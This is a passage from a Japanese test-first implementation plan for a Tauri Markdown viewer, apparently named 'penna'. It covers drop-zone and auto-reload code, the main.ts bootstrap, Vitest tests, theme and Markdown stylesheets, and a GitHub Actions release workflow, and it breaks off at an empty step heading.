Expected: FAIL — まだ `mountDropZone` 未実装で import 解決不可。

- [ ] **Step 7: dropzone を最小実装する**

ドロップゾーン UI と「開く」ボタンを描画する。`onOpen(path)` には `open_in_new_window` を呼ぶ役割は持たせず、UI 側からのコールバックとして渡す（`open_in_new_window` の invoke は `main.ts` 配線で行うが、ここではドロップ/ダイアログ由来のパスを `onOpen` に渡し、ダイアログは `open_file_dialog` を直接 invoke する）。Tauri の drag-drop は `enter`/`over`/`drop`/`leave` の `type` を持つため `drop` のみ処理する。DOM フォールバック用に `dragover`/`drop` も配線する。

```ts
// src/ui/dropzone.ts
import { invoke } from "@tauri-apps/api/core";
import { getCurrentWebviewWindow } from "@tauri-apps/api/webviewWindow";

const MARKDOWN_EXTENSIONS = ["md", "markdown", "mdown", "mkd", "mkdn", "mdwn"];

interface TauriDragPayload {
  paths?: string[];
}

function isTauriPayload(detail: TauriDragPayload | DragEvent): detail is TauriDragPayload {
  return Array.isArray((detail as TauriDragPayload).paths);
}

export function extractDroppedPath(detail: TauriDragPayload | DragEvent): string | null {
  if (isTauriPayload(detail)) {
    const paths = detail.paths ?? [];
    return paths.length > 0 ? paths[0] : null;
  }
  const file = detail.dataTransfer?.files?.[0] as (File & { path?: string }) | undefined;
  if (file && typeof file.path === "string" && file.path !== "") {
    return file.path;
  }
  return null;
}

export function mountDropZone(root: HTMLElement, onOpen: (path: string) => void): void {
  const zone = document.createElement("div");
  zone.className = "drop-zone";
  zone.dataset.state = "idle";

  const hint = document.createElement("p");
  hint.className = "drop-zone-hint";
  hint.textContent = "Drop a Markdown or text file here";

  const exts = document.createElement("p");
  exts.className = "drop-zone-exts";
  exts.textContent = MARKDOWN_EXTENSIONS.map((e) => `.${e}`).join(" ");

  const openBtn = document.createElement("button");
  openBtn.type = "button";
  openBtn.dataset.action = "open";
  openBtn.className = "drop-zone-open";
  openBtn.textContent = "Open…";

  zone.appendChild(hint);
  zone.appendChild(exts);
  zone.appendChild(openBtn);
  root.appendChild(zone);

  openBtn.addEventListener("click", () => {
    void invoke<string | null>("open_file_dialog").then((path) => {
      if (typeof path === "string" && path !== "") {
        onOpen(path);
      }
    });
  });

  // Tauri webview native drag-drop (provides absolute paths[]).
  const webview = getCurrentWebviewWindow();
  void webview.onDragDropEvent((event) => {
    const payload = event.payload as { type: string; paths?: string[] };
    if (payload.type === "drop") {
      const path = extractDroppedPath({ paths: payload.paths });
      zone.dataset.state = "idle";
      if (path) onOpen(path);
    } else if (payload.type === "enter" || payload.type === "over") {
      zone.dataset.state = "active";
    } else if (payload.type === "leave") {
      zone.dataset.state = "idle";
    }
  });

  // DOM fallback (e.g. tests / webviews surfacing File.path).
  zone.addEventListener("dragover", (e) => {
    e.preventDefault();
    zone.dataset.state = "active";
  });
  zone.addEventListener("dragleave", () => {
    zone.dataset.state = "idle";
  });
  zone.addEventListener("drop", (e) => {
    e.preventDefault();
    zone.dataset.state = "idle";
    const path = extractDroppedPath(e);
    if (path) onOpen(path);
  });
}
```

Run: `npm run test -- --run src/ui/dropzone.test.ts`
Expected: PASS（extractDroppedPath 4 tests + mountDropZone 3 tests = 7 passed）。

- [ ] **Step 8: dropzone をコミットする**

```bash
git add src/ui/dropzone.ts src/ui/dropzone.test.ts
git commit -m "feat(ui): add drop zone with Tauri drag-drop and Open dialog routing"
```

- [ ] **Step 9: wireAutoReload の失敗テストを書く（autoReload 尊重）**

※ `wireAutoReload`（`ui/autoReload.ts`）は契約に明記された公開シンボルではなく、テスト容易性のために main.ts のインライン配線（`file-changed` / `file-removed` の購読）を切り出した内部ヘルパ。内部で契約上のイベント名 `file-changed` / `file-removed` を使う。

`file-changed`（payload=`LoadedFile`）受信時、`getAutoReload()` が true のときだけ `onReload` を呼び、false なら呼ばない。`file-removed`（payload=`{path}`）は常に `onRemoved` を呼ぶ。`listen` をモックしてハンドラを捕捉する。

```ts
// src/ui/autoReload.test.ts
import { describe, it, expect, vi, beforeEach } from "vitest";

type Handler = (e: { payload: unknown }) => void;
const handlers = new Map<string, Handler>();
const listen = vi.fn(async (name: string, cb: Handler) => {
  handlers.set(name, cb);
  return () => handlers.delete(name);
});
vi.mock("@tauri-apps/api/event", () => ({ listen: (...a: unknown[]) => (listen as any)(...a) }));

import { wireAutoReload } from "./autoReload";
import type { LoadedFile } from "../types";

const sample: LoadedFile = {
  path: "/x/readme.md",
  text: "# hi",
  encoding: "UTF-8",
  kind: "Markdown",
};

describe("wireAutoReload", () => {
  beforeEach(() => {
    handlers.clear();
    listen.mockClear();
  });

  it("calls onReload on file-changed when autoReload is true", async () => {
    const onReload = vi.fn();
    const onRemoved = vi.fn();
    await wireAutoReload(() => true, onReload, onRemoved);
    handlers.get("file-changed")!({ payload: sample });
    expect(onReload).toHaveBeenCalledWith(sample);
  });

  it("skips onReload on file-changed when autoReload is false", async () => {
    const onReload = vi.fn();
    const onRemoved = vi.fn();
    await wireAutoReload(() => false, onReload, onRemoved);
    handlers.get("file-changed")!({ payload: sample });
    expect(onReload).not.toHaveBeenCalled();
  });

  it("always calls onRemoved on file-removed", async () => {
    const onReload = vi.fn();
    const onRemoved = vi.fn();
    await wireAutoReload(() => false, onReload, onRemoved);
    handlers.get("file-removed")!({ payload: { path: "/x/readme.md" } });
    expect(onRemoved).toHaveBeenCalledWith("/x/readme.md");
  });
});
```

Run: `npm run test -- --run src/ui/autoReload.test.ts`
Expected: FAIL — `Failed to resolve import "./autoReload"`。

- [ ] **Step 10: wireAutoReload を最小実装する**

`getAutoReload` を呼び出し時評価（クロージャで最新の設定を参照）にすることで、設定変更が即時に反映される。`UnlistenFn[]` を返し、呼び出し側で破棄できるようにする。

```ts
// src/ui/autoReload.ts
import { listen, type UnlistenFn } from "@tauri-apps/api/event";
import type { LoadedFile } from "../types";

export async function wireAutoReload(
  getAutoReload: () => boolean,
  onReload: (file: LoadedFile) => void,
  onRemoved: (path: string) => void,
): Promise<UnlistenFn[]> {
  const unChanged = await listen<LoadedFile>("file-changed", (event) => {
    if (getAutoReload()) {
      onReload(event.payload);
    }
  });
  const unRemoved = await listen<{ path: string }>("file-removed", (event) => {
    onRemoved(event.payload.path);
  });
  return [unChanged, unRemoved];
}
```

Run: `npm run test -- --run src/ui/autoReload.test.ts`
Expected: PASS（3 tests passed）。

- [ ] **Step 11: autoReload をコミットする**

```bash
git add src/ui/autoReload.ts src/ui/autoReload.test.ts
git commit -m "feat(ui): wire file-changed/file-removed listeners honoring autoReload"
```

- [ ] **Step 12: main.ts を最終形（統合済み）に確定する（唯一の正）**

この Step の `src/main.ts` が **唯一の最終形**であり、Task 8/11/13/14 で段階的に書いてきた途中形をすべて吸収する（各 Task の main.ts 断片はここに収束する）。本 Step では、前タスクで作った `dirnameOf`（Task 8）・`handleContentClick`（Task 11）・`FindBar`（Task 13）・`applyTheme`/`applyFont`（Task 14/M7）・`setZoom`/`zoomIn`/`zoomOut`/`resetZoom`（Task 14）・`mountSettingsPanel`/`mountDropZone`/`wireAutoReload`（Task 15）を 1 つの bootstrap に統合する。

統合内容:
- `bootstrap()`: `get_settings` → `applyTheme(settings.theme)` / `applyFont(settings.fontFamily)` / `setZoom(settings.fontSize/16)` → `mountSettingsPanel(#settings, get, set)`（set で `set_settings` を呼び `settings` を更新）→ `window_path` 取得。
- パスあり: `load_file` → `dirnameOf(path)` で baseDir 算出 → `render()`（renderDocument で `.markdown-body` ラップ済み HTML を `#content` に注入 → `highlightAll(#content)`）→ `#encoding` に `file.encoding` を表示（H1 / spec §7）→ `#content` にクリック委譲（`handleContentClick(event, baseDir, { invoke })`）→ `wireAutoReload` を `() => settings.autoReload` で配線し、リロード時は scrollTop を保存・復元、削除時は `.doc-banner` を表示。
- パスなし: `mountDropZone(#content, (p)=>invoke("open_in_new_window",{path:p}))`、`#encoding` を空文字でクリア。
- `FindBar` を `new FindBar(document.body)` で 1 つ生成し、単一の keydown リスナーで Cmd/Ctrl+F→open / Escape→close / Cmd/Ctrl +/=→zoomIn / Cmd/Ctrl -→zoomOut / Cmd/Ctrl 0→resetZoom を処理。`#findbar-input` の input→search、Enter→next、Shift+Enter→prev も配線。

`dirnameOf`（Task 8 で定義・テスト済み）をそのまま使う（インラインの `dirOf` は再定義しない）。`handleContentClick` / `wireAutoReload` / `mountDropZone` の `extractDroppedPath` は契約に明記された公開シンボルではなく、テスト容易性のために main.ts のインライン配線を切り出した内部ヘルパであり、内部で契約名の `classifyLink` / `resolveImageSrc` を使う。

`src/main.ts`（最終形・全文）:
```ts
import { invoke } from "@tauri-apps/api/core";
import { getCurrentWebviewWindow } from "@tauri-apps/api/webviewWindow";
import type { LoadedFile, Settings } from "./types";
import { renderDocument } from "./markdown/renderer";
import { highlightAll } from "./markdown/highlight";
import { handleContentClick } from "./ui/contentClick";
import { FindBar } from "./ui/find";
import { applyFont, applyTheme } from "./ui/theme";
import { resetZoom, setZoom, zoomIn, zoomOut } from "./ui/zoom";
import { mountSettingsPanel } from "./ui/settingsPanel";
import { mountDropZone } from "./ui/dropzone";
import { wireAutoReload } from "./ui/autoReload";
import "./styles/theme.css";
import "./styles/markdown.css";

const BASE_FONT_SIZE = 16;

/** ファイルパス → 親ディレクトリ（POSIX `/` と Windows `\` の両対応）。 */
export function dirnameOf(path: string): string {
  const lastSlash = Math.max(path.lastIndexOf("/"), path.lastIndexOf("\\"));
  return lastSlash >= 0 ? path.slice(0, lastSlash) : "";
}

/**
 * Show the detected encoding in the status bar (spec §7). Exported so the
 * render wiring's encoding-display contract is unit-testable; pass "" to clear.
 */
export function setEncoding(text: string): void {
  const el = document.getElementById("encoding");
  if (el) {
    el.textContent = text;
  }
}

/** FindBar とキーバインド（検索＋ズーム）を 1 つの keydown リスナーに集約する。 */
function wireKeyboard(findBar: FindBar): void {
  window.addEventListener("keydown", (event) => {
    const accel = event.metaKey || event.ctrlKey;
    if (accel && event.key.toLowerCase() === "f") {
      event.preventDefault();
      findBar.open();
      return;
    }
    if (event.key === "Escape") {
      findBar.close();
      return;
    }
    if (!accel) {
      return;
    }
    if (event.key === "+" || event.key === "=") {
      event.preventDefault();
      zoomIn();
    } else if (event.key === "-") {
      event.preventDefault();
      zoomOut();
    } else if (event.key === "0") {
      event.preventDefault();
      resetZoom();
    }
  });

  const input = document.querySelector<HTMLInputElement>("#findbar-input");
  input?.addEventListener("input", () => {
    findBar.search(input.value);
  });
  input?.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
      event.preventDefault();
      if (event.shiftKey) {
        findBar.prev();
      } else {
        findBar.next();
      }
    }
  });
}

async function bootstrap(): Promise<void> {
  const contentEl = document.querySelector<HTMLElement>("#content")!;
  const settingsEl = document.querySelector<HTMLElement>("#settings")!;

  let settings = await invoke<Settings>("get_settings");
  applyTheme(settings.theme);
  applyFont(settings.fontFamily);
  setZoom(settings.fontSize / BASE_FONT_SIZE);

  const getSettings = async (): Promise<Settings> => settings;
  const setSettings = async (s: Settings): Promise<void> => {
    settings = s;
    await invoke("set_settings", { settings: s });
  };
  mountSettingsPanel(settingsEl, getSettings, setSettings);

  const findBar = new FindBar(document.body);
  wireKeyboard(findBar);

  const webview = getCurrentWebviewWindow();
  void webview.label;
  const path = await invoke<string | null>("window_path");

  if (path) {
    const baseDir = dirnameOf(path);

    function render(file: LoadedFile): void {
      contentEl.innerHTML = renderDocument(file, dirnameOf(file.path));
      void highlightAll(contentEl);
      setEncoding(file.encoding);
    }

    const file = await invoke<LoadedFile>("load_file", { path });
    render(file);

    contentEl.addEventListener("click", (event) =>
      handleContentClick(event, baseDir, { invoke }),
    );

    await wireAutoReload(
      () => settings.autoReload,
      (updated) => {
        const scrollTop = document.documentElement.scrollTop;
        render(updated);
        document.documentElement.scrollTop = scrollTop;
      },
      (removed) => {
        const banner = document.createElement("div");
        banner.className = "doc-banner";
        banner.textContent = `File no longer available: ${removed}`;
        contentEl.prepend(banner);
      },
    );
  } else {
    setEncoding("");
    mountDropZone(contentEl, (p) => {
      void invoke("open_in_new_window", { path: p });
    });
  }
}

document.addEventListener("DOMContentLoaded", () => {
  void bootstrap();
});
```

Run: `npm run build`
Expected: TypeScript の型エラー無くビルド成功（`vite build` が完了）。`dirnameOf` は引き続きエクスポートしているため、`src/main.test.ts`（Task 8）の `dirnameOf` テストも緑のまま。

- [ ] **Step 13: エンコーディング表示の回帰テストを main.test.ts に追記する（H1 / spec §7）**

`setEncoding` がステータスバーの `#encoding` に判定結果を反映すること（および空文字でクリアすること）を固定する。`#statusbar`/`#encoding` を持つ DOM を用意し、`LoadedFile.encoding`（例 `"Shift_JIS"`）が `#encoding` の textContent に入ることを断言する。

`src/main.test.ts`（末尾に追記）:
```ts
import { setEncoding } from "./main";
import type { LoadedFile } from "./types";

describe("setEncoding", () => {
  beforeEach(() => {
    document.body.innerHTML =
      '<main id="content"></main><footer id="statusbar"><span id="encoding"></span></footer>';
  });

  it("shows the detected encoding from a LoadedFile in #encoding", () => {
    const file: LoadedFile = {
      path: "/docs/legacy.txt",
      text: "本文",
      encoding: "Shift_JIS",
      kind: "PlainText",
    };
    setEncoding(file.encoding);
    expect(document.getElementById("encoding")?.textContent).toBe("Shift_JIS");
  });

  it("clears #encoding when given an empty string (no file)", () => {
    setEncoding("Shift_JIS");
    setEncoding("");
    expect(document.getElementById("encoding")?.textContent).toBe("");
  });
});
```

`src/main.test.ts` 先頭の vitest import が `describe, it, expect` のみの場合は `beforeEach` を追加する（`import { describe, it, expect, beforeEach } from "vitest";`）。

Run: `npx vitest run src/main.test.ts`
Expected: PASS（`dirnameOf` 4 + `setEncoding` 2 = `Tests 6 passed`）。

- [ ] **Step 14: main.ts 配線をコミットする**

```bash
git add src/main.ts src/main.test.ts
git commit -m "feat(ui): mount settings panel, drop zone, and auto-reload in bootstrap"
```

### Task 16: スタイルシート（テーマ変数 / Markdown 本文 / 検索ハイライト / プレーンテキスト）

CSS は純スタイルのため単体テストは行わず、最後に手動検証チェックリスト Step を置く。テーマ変数は `[data-theme]` で切り替え、`applyTheme` が `<html>` に `data-theme` を付与する前提に合わせる。CSS 変数キーは `--bg,--fg,--accent,--code-bg,--border` を必ず含める。

- [ ] **Step 1: テーマ変数 CSS を作成する**

`:root` をライト既定とし、`[data-theme="dark"]` でダーク変数を上書きする。`prefers-color-scheme` は `applyTheme`/`resolveTheme`（他エリア）が `system` を解決して `data-theme` を確定させる方針のため、CSS 側は明示の `data-theme` を正とする。

```css
/* src/styles/theme.css */
:root {
  --bg: #ffffff;
  --fg: #1f2328;
  --muted: #57606a;
  --accent: #0969da;
  --code-bg: #f6f8fa;
  --border: #d0d7de;
  --hit-bg: #fff3a3;
  --hit-active-bg: #ffb454;

  color-scheme: light;
  background-color: var(--bg);
  color: var(--fg);
  font-size: 16px;
}

:root[data-theme="dark"] {
  --bg: #0d1117;
  --fg: #e6edf3;
  --muted: #8b949e;
  --accent: #4493f8;
  --code-bg: #161b22;
  --border: #30363d;
  --hit-bg: #6a5a00;
  --hit-active-bg: #b58900;

  color-scheme: dark;
}

* {
  box-sizing: border-box;
}

html,
body {
  margin: 0;
  padding: 0;
  background-color: var(--bg);
  color: var(--fg);
}

body {
  font-family: var(--app-font, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif);
}

/* Status bar: encoding indicator (spec §7 — show detection result in-window) */
#statusbar {
  display: flex;
  justify-content: flex-end;
  padding: 0.2rem 0.8rem;
  border-top: 1px solid var(--border);
  background-color: var(--code-bg);
}
.status-encoding {
  color: var(--muted);
  font-size: 0.75em;
  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
}
#statusbar:empty,
.status-encoding:empty {
  /* Keep the bar; the encoding span is simply blank when no file is open. */
}

/* Removed-file / status banner */
.doc-banner {
  margin: 0 0 1rem;
  padding: 0.6rem 1rem;
  border: 1px solid var(--border);
  border-left: 4px solid var(--accent);
  background-color: var(--code-bg);
  color: var(--fg);
  border-radius: 4px;
  font-size: 0.9em;
}

/* Settings panel */
.settings-panel {
  display: flex;
  flex-direction: column;
  gap: 0.75rem;
  padding: 1rem;
}
.settings-row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 1rem;
}
.settings-label {
  color: var(--muted);
}
.settings-panel input[type="text"],
.settings-panel input[type="number"],
.settings-panel select {
  background-color: var(--bg);
  color: var(--fg);
  border: 1px solid var(--border);
  border-radius: 4px;
  padding: 0.25rem 0.5rem;
}

/* Drop zone */
.drop-zone {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 0.75rem;
  min-height: 60vh;
  margin: 2rem;
  border: 2px dashed var(--border);
  border-radius: 12px;
  color: var(--muted);
  text-align: center;
}
.drop-zone[data-state="active"] {
  border-color: var(--accent);
  color: var(--fg);
}
.drop-zone-exts {
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  font-size: 0.85em;
}
.drop-zone-open {
  padding: 0.4rem 1.2rem;
  border: 1px solid var(--border);
  border-radius: 6px;
  background-color: var(--code-bg);
  color: var(--fg);
  cursor: pointer;
}
.drop-zone-open:hover {
  border-color: var(--accent);
}
```

(この Step に Run は無い。次の Step でビルド確認する。)

- [ ] **Step 2: Markdown 本文・コード・表・引用・タスクリスト・検索ヒット・プレーンテキストの CSS を作成する**

本文は読みやすい行長（measure 約 72ch）に制限。`.markdown-body` を本文ルート、`.plaintext` をプレーンテキスト用 `<pre>` のクラスとする。`.markdown-body` ラッパは renderDocument（Task 9）が Markdown 出力を包んで出力するため、本 CSS の `.markdown-body ...` セレクタは実際に当たる。検索ヒットは CSS Custom Highlight API（`::highlight(find-hit)`）と span フォールバック（`.find-hit` / `.find-hit-current`）の両対応。

注: renderer（Task 9）が出力する `<div class="markdown-body">` ラッパ・`<pre class="plaintext">`、および FindBar（Task 13）の `mark.find-hit` / `mark.find-hit-current` クラスに一致させる。現在ヒットは `.find-hit-current`（FindBar の `CURRENT_CLASS`）で着色する。

```css
/* src/styles/markdown.css */
.markdown-body {
  max-width: 72ch;
  margin: 0 auto;
  padding: 2rem 1.5rem 4rem;
  line-height: 1.7;
  word-wrap: break-word;
}

.markdown-body h1,
.markdown-body h2,
.markdown-body h3,
.markdown-body h4,
.markdown-body h5,
.markdown-body h6 {
  margin: 1.8em 0 0.6em;
  line-height: 1.25;
  font-weight: 600;
}
.markdown-body h1 {
  font-size: 2em;
  padding-bottom: 0.3em;
  border-bottom: 1px solid var(--border);
}
.markdown-body h2 {
  font-size: 1.5em;
  padding-bottom: 0.3em;
  border-bottom: 1px solid var(--border);
}
.markdown-body h3 { font-size: 1.25em; }
.markdown-body h4 { font-size: 1em; }

.markdown-body p,
.markdown-body ul,
.markdown-body ol {
  margin: 0 0 1em;
}

.markdown-body a {
  color: var(--accent);
  text-decoration: none;
}
.markdown-body a:hover {
  text-decoration: underline;
}

.markdown-body img {
  max-width: 100%;
  height: auto;
}

/* Inline code + code blocks */
.markdown-body code {
  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
  font-size: 0.9em;
  background-color: var(--code-bg);
  padding: 0.15em 0.35em;
  border-radius: 4px;
}
.markdown-body pre {
  background-color: var(--code-bg);
  border: 1px solid var(--border);
  border-radius: 6px;
  padding: 1rem;
  overflow-x: auto;
  line-height: 1.5;
}
.markdown-body pre code {
  background: none;
  padding: 0;
  font-size: 0.875em;
}

/* Tables (GFM) */
.markdown-body table {
  border-collapse: collapse;
  width: 100%;
  margin: 0 0 1em;
  overflow-x: auto;
  display: block;
}
.markdown-body th,
.markdown-body td {
  border: 1px solid var(--border);
  padding: 0.4em 0.8em;
}
.markdown-body th {
  background-color: var(--code-bg);
  font-weight: 600;
}

/* Blockquote */
.markdown-body blockquote {
  margin: 0 0 1em;
  padding: 0 1em;
  color: var(--muted);
  border-left: 4px solid var(--border);
}

/* GFM task-list checkboxes */
.markdown-body .task-list-item,
.markdown-body li.task-list-item {
  list-style: none;
}
.markdown-body .task-list-item input[type="checkbox"] {
  margin: 0 0.5em 0 -1.4em;
  vertical-align: middle;
}

/* Horizontal rule */
.markdown-body hr {
  border: 0;
  border-top: 1px solid var(--border);
  margin: 2em 0;
}

/* Find-hit highlight: CSS Custom Highlight API + span fallback */
::highlight(find-hit) {
  background-color: var(--hit-bg);
  color: inherit;
}
::highlight(find-hit-current) {
  background-color: var(--hit-active-bg);
  color: inherit;
}
.find-hit {
  background-color: var(--hit-bg);
  border-radius: 2px;
}
.find-hit-current {
  background-color: var(--hit-active-bg);
  border-radius: 2px;
}

/* Plain-text rendering */
.plaintext {
  max-width: 90ch;
  margin: 0 auto;
  padding: 2rem 1.5rem 4rem;
  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
  font-size: 0.95em;
  line-height: 1.6;
  white-space: pre-wrap;
  word-break: break-word;
  tab-size: 4;
}
```

Run: `npm run build`
Expected: CSS が `main.ts` 経由でバンドルされビルド成功（`dist/` 生成）。

- [ ] **Step 3: スタイルをコミットする**

```bash
git add src/styles/theme.css src/styles/markdown.css
git commit -m "feat(ui): add theme variables and markdown/plaintext/find-hit styles"
```

- [ ] **Step 4: 手動検証チェックリストを実行する（CSS のため自動テスト無し）**

`npm run tauri dev` でアプリを起動し、以下を目視確認する。問題があればその Step の CSS を修正して再確認する。

- [ ] ライト/ダーク切替: 設定パネルで theme を切替えると `<html data-theme>` が変わり、`--bg`/`--fg` が即時反映される（背景・文字色が反転する）。
- [ ] 本文の行長: 長い段落が約 72ch で折り返され、中央寄せされている。
- [ ] 見出し: h1/h2 に下線（`--border`）が付き、階層でサイズが段階的に小さくなる。
- [ ] コードブロック: `--code-bg` 背景・枠線・横スクロール、インラインコードに薄い背景。
- [ ] 表（GFM）: セルに枠線、ヘッダ行に背景。横長表が横スクロールする。
- [ ] 引用: 左ボーダーと `--muted` 文字色。
- [ ] タスクリスト: `- [ ]` / `- [x]` がチェックボックス表示になり、リストマーカーが消えている。
- [ ] 検索ヒット: Cmd/Ctrl+F で一致箇所が `--hit-bg`、現在ヒットが `--hit-active-bg` でハイライトされる（Custom Highlight API 非対応環境では `.find-hit`/`.find-hit-current` span でも同様）。
- [ ] プレーンテキスト: `.txt` を開くと等幅フォント・ソフトラップ（`pre-wrap`）で表示される。
- [ ] ドロップゾーン: ファイル未指定で起動すると破線枠のドロップゾーンが出て、ドラッグ中に枠が `--accent` になり、「Open…」ボタンが機能する。
- [ ] 削除バナー: 開いているファイルを別途削除すると `.doc-banner` が本文上部に表示される。

### Task 17: クロスプラットフォーム リリースビルド マトリクス（`.github/workflows/release.yml`）

このタスクは「タグ push（`v*`）で全対象 OS のインストーラを `tauri-action` でビルドし、GitHub Release を作成する」CI を構築する。設定タスクのため「テスト」は (1) `actionlint` による YAML 構文/式の検証、(2) 手動ドライランの手順記載で代替する。spec §11 のマトリクス（macOS=ARM64 dmg/app、Windows=x86_64/aarch64 msi/NSIS、Linux=x86_64/aarch64 AppImage/deb）を厳守する。本タスクでは署名はまだ行わない（Task 18 で macOS 署名を追加）。

- [ ] **Step 1: `actionlint` をローカル導入して検証コマンドを使えるようにする**

何をするか: GitHub Actions の lint ツール `actionlint` を入れる。なぜ必要か: 後続ステップで書く YAML を構文・式・matrix 参照レベルで検証し、push 前にミスを潰すため（このタスクの「テスト」に相当）。どう書くか:

```bash
brew install actionlint
actionlint --version
```

Run: `actionlint --version`
Expected: `1.7.x`（バージョン番号が表示されれば成功。未導入なら `command not found`）

- [ ] **Step 2: ワークフロー検証を「失敗する状態」で先に確認する（RED）**

何をするか: まだ `release.yml` が存在しないことを確認する。なぜ必要か: TDD のレッド段階として「検証対象が無い＝失敗」を明示するため。どう書くか:

```bash
mkdir -p .github/workflows
actionlint .github/workflows/release.yml
```

Run: `actionlint .github/workflows/release.yml`
Expected (FAIL): `failed to read .github/workflows/release.yml: open .github/workflows/release.yml: no such file or directory`

- [ ] **Step 3: `release.yml` のトリガと `create-release` ジョブ（Draft Release 作成）を書く**

何をするか: タグ push と手動実行をトリガにし、最初に Draft Release を作るジョブを定義する。なぜ必要か: 後続のビルドジョブが各 OS の成果物をこの Release に紐付けてアップロードできるようにするため（`tauri-action` の `releaseId` 連携）。どう書くか:

```yaml
# .github/workflows/release.yml
name: release

on:
  push:
    tags:
      - "v*"
  workflow_dispatch: {}

permissions:
  contents: write

jobs:
  create-release:
    runs-on: ubuntu-latest
    outputs:
      release_id: ${{ steps.create.outputs.result }}
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Create draft release
        id: create
        uses: actions/github-script@v7
        with:
          script: |
            const tag = context.ref.replace("refs/tags/", "");
            const name = context.ref.startsWith("refs/tags/")
              ? `penna ${tag}`
              : `penna nightly-${context.sha.slice(0, 7)}`;
            const { data } = await github.rest.repos.createRelease({
              owner: context.repo.owner,
              repo: context.repo.repo,
              tag_name: context.ref.startsWith("refs/tags/") ? tag : `nightly-${context.sha.slice(0, 7)}`,
              name,
              draft: true,
              prerelease: false,
              generate_release_notes: true,
            });
            return data.id;
```

- [ ] **Step 4: `build-tauri` マトリクスジョブ（OS / ターゲット / バンドル）を追加する**

何をするか: macOS(ARM64) / Windows(x86_64, aarch64) / Linux(x86_64, aarch64) の 5 構成を `include` マトリクスで定義し、各構成に Rust ターゲットと `tauri-action` 引数（`args`）を割り当てる。なぜ必要か: spec §11 の成果物セット（dmg/app, msi/NSIS, AppImage/deb）を 1 ワークフローで網羅するため。Linux ARM64 は cross 環境が重いので、本構成では **ARM64 ネイティブランナー `ubuntu-24.04-arm`** を使い、クロスコンパイルの複雑さを避ける（クロスコンパイルを選ぶ場合の注記は Step 9）。どう書くか（`jobs:` 配下、`create-release:` の後に追記）:

```yaml
  build-tauri:
    needs: create-release
    permissions:
      contents: write
    strategy:
      fail-fast: false
      matrix:
        include:
          - platform: macos-14
            target: aarch64-apple-darwin
            args: "--target aarch64-apple-darwin"
          - platform: windows-latest
            target: x86_64-pc-windows-msvc
            args: "--target x86_64-pc-windows-msvc"
          - platform: windows-latest
            target: aarch64-pc-windows-msvc
            args: "--target aarch64-pc-windows-msvc"
          - platform: ubuntu-22.04
            target: x86_64-unknown-linux-gnu
            args: "--target x86_64-unknown-linux-gnu"
          - platform: ubuntu-24.04-arm
            target: aarch64-unknown-linux-gnu
            args: "--target aarch64-unknown-linux-gnu"
    runs-on: ${{ matrix.platform }}
    steps:
      - name: Checkout
        uses: actions/checkout@v4
```

注記: Linux の `tauri-action` は古い WebKitGTK 互換性のため `ubuntu-22.04` を基準にする（`ubuntu-latest` は将来 24.04 に移行し glibc/webkit 依存が新環境向けになるため、配布バイナリの互換性確保上 22.04 を固定）。

- [ ] **Step 5: Linux のシステム依存インストールステップを追加する（条件付き）**

何をするか: Linux ランナーでのみ WebKitGTK 4.1 などの dev パッケージを apt で入れる。なぜ必要か: Tauri v2 の Linux ビルドは `libwebkit2gtk-4.1-dev` 等が無いと `pkg-config` でリンクに失敗するため（spec §4・§14 の WebKitGTK 依存）。どう書くか（`build-tauri` の steps に追記）:

```yaml
      - name: Install Linux dependencies
        if: startsWith(matrix.platform, 'ubuntu')
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            libwebkit2gtk-4.1-dev \
            libappindicator3-dev \
            librsvg2-dev \
            patchelf \
            libgtk-3-dev \
            build-essential \
            curl \
            wget \
            file \
            libxdo-dev \
            libssl-dev
```

- [ ] **Step 6: Rust / Node のセットアップステップを追加する**

何をするか: 対象トリプル付きの Rust toolchain、Rust ビルドキャッシュ、Node + 依存インストールを設定する。なぜ必要か: `tauri-action` は内部で `cargo build` とフロント（`npm run build` 想定）を回すため、両ツールチェーンと matrix target の追加が必要。どう書くか（`build-tauri` の steps に追記）:

```yaml
      - name: Setup Rust toolchain
        uses: dtolnay/rust-toolchain@stable
        with:
          targets: ${{ matrix.target }}

      - name: Rust cache
        uses: swatinem/rust-cache@v2
        with:
          workspaces: "./src-tauri -> target"
          key: ${{ matrix.target }}

      - name: Setup Node
        uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm

      - name: Install frontend dependencies
        run: npm ci
```

- [ ] **Step 7: `tauri-action` ビルド＆アップロードステップを追加する**

何をするか: `tauri-apps/tauri-action` を呼び、`create-release` が出した `releaseId` に各 OS の成果物をアップロードする。なぜ必要か: Tauri バンドル生成（dmg/app, msi/NSIS, AppImage/deb）と Release への添付を 1 アクションで行うため。`args` は matrix のターゲット指定をそのまま渡す。どう書くか（`build-tauri` の steps の末尾に追記）:

```yaml
      - name: Build and upload Tauri bundles
        uses: tauri-apps/tauri-action@v0
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          releaseId: ${{ needs.create-release.outputs.release_id }}
          args: ${{ matrix.args }}
```

注記: Windows の NSIS と MSI、Linux の AppImage と deb の生成可否は `src-tauri/tauri.conf.json` の `bundle.targets`（`"all"` か明示配列）で決まる。本タスクのワークフローは `targets` を指定しないため、`tauri.conf.json` 側で各 OS のデフォルト（Windows=msi+nsis, Linux=appimage+deb, macOS=app+dmg）が生成される前提。

- [ ] **Step 8: Draft Release を publish するジョブを追加する**

何をするか: 全ビルドが成功したら Draft を公開状態に切り替える。なぜ必要か: `create-release` で `draft: true` にしてあるため、成果物が揃ってから一括公開し「成果物欠落の Release」を避けるため。どう書くか（`jobs:` 配下の末尾に追記）:

```yaml
  publish-release:
    needs: [create-release, build-tauri]
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - name: Publish release
        uses: actions/github-script@v7
        with:
          script: |
            await github.rest.repos.updateRelease({
              owner: context.repo.owner,
              repo: context.repo.repo,
              release_id: ${{ needs.create-release.outputs.release_id }},
              draft: false,
            });
```

- [ ] **Step 9: ARM Linux クロスコンパイル代替手順をワークフロー冒頭にコメントで明記する**

